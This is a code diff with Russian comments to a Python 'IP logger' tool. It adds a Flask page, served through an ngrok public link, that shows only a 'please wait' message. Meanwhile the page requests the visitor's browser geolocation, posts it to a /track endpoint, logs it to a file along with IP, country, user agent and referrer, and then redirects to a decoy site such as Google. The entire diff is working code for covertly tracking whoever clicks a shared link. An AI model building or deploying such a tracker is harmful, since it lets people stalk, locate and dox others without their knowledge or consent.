@@ -24,7 +24,7 @@ import flask
 import datetime
 import socket
 import threading
-from flask import Flask, request, redirect
+from flask import Flask, request, jsonify, redirect
 from pyngrok import ngrok
 import requests
 import random
@@ -226,14 +226,19 @@ def start_ip_logger(redirect_url="https://google.com", port=5000):
     app = Flask(__name__)
     LOG_FILE = "ip_logs.txt"
 
-    def log_ip(ip, user_agent, country):
+    def log_data(ip, user_agent, country, referrer, lat, lon):
+        """ Логирует данные пользователя """
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] IP: {ip} | Страна: {country} | User-Agent: {user_agent}\n"
+        log_entry = (f"[{timestamp}] IP: {ip} | Страна: {country} | User-Agent: {user_agent} | "
+                     f"Referrer: {referrer} | Геолокация: {lat}, {lon}\n")
+
         with open(LOG_FILE, "a") as file:
             file.write(log_entry)
+
         print(log_entry.strip())
 
     def get_country(ip):
+        """ Определяет страну по IP """
         try:
             response = requests.get(f"https://ipinfo.io/{ip}/json").json()
             return response.get("country", "Неизвестно")
@@ -242,27 +247,80 @@ def start_ip_logger(redirect_url="https://google.com", port=5000):
             return "Ошибка API"
 
     @app.route("/")
-    def track_ip():
+    def index():
+        """ Отдаёт HTML страницу для запроса геолокации """
+        return """<!DOCTYPE html>
+        <html lang="ru">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Определение геолокации</title>
+        </head>
+        <body>
+            <h2>Подождите...</h2>
+            <script>
+                function sendLocation(latitude, longitude) {
+                    fetch("/track", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ latitude, longitude })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.redirect) {
+                            window.location.href = data.redirect;
+                        }
+                    })
+                    .catch(error => console.error("Ошибка:", error));
+                }
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            sendLocation(position.coords.latitude, position.coords.longitude);
+                        },
+                        error => {
+                            console.warn("Геолокация не разрешена:", error);
+                            sendLocation("Неизвестно", "Неизвестно");
+                        }
+                    );
+                } else {
+                    console.warn("Геолокация не поддерживается браузером");
+                    sendLocation("Неизвестно", "Неизвестно");
+                }
+            </script>
+        </body>
+        </html>"""
+
+    @app.route("/track", methods=["POST"])
+    def track():
+        """ Получает данные от клиента и логирует их """
         try:
-            # Получаем реальный IP через X-Forwarded-For, если доступен
+            data = request.json
             user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
             user_agent = request.headers.get("User-Agent", "Unknown")
+            referrer = request.headers.get("Referer", "Нет данных")
             country = get_country(user_ip)
-            log_ip(user_ip, user_agent, country)
-            return redirect(redirect_url)
-        except Exception as e:
-            print(f"Ошибка в track_ip: {e}")
-            return "Ошибка обработки запроса", 500
 
-    # Запуск Ngrok
+            lat = data.get("latitude", "Неизвестно")
+            lon = data.get("longitude", "Неизвестно")
+
+            log_data(user_ip, user_agent, country, referrer, lat, lon)
+
+            return jsonify({"status": "ok", "redirect": redirect_url})
+
+        except Exception as e:
+            print(f"Ошибка в обработке данных: {e}")
+            return jsonify({"status": "error"}), 500
+
+    # Запуск Ngrok и Flask
     try:
         public_url = ngrok.connect(port).public_url
-        print(f"🔗 Ссылка для отслеживания IP: {public_url}")
+        print(f"🔗 Ссылка для отслеживания: {public_url}")
 
-        # Запуск Flask в фоне
         app.run(host="0.0.0.0", port=port)
     except Exception as e:
-        print(f"Ошибка запуска Ngrok или Flask: {e}")
+        print(f"Ошибка запуска: {e}")
 
 
 
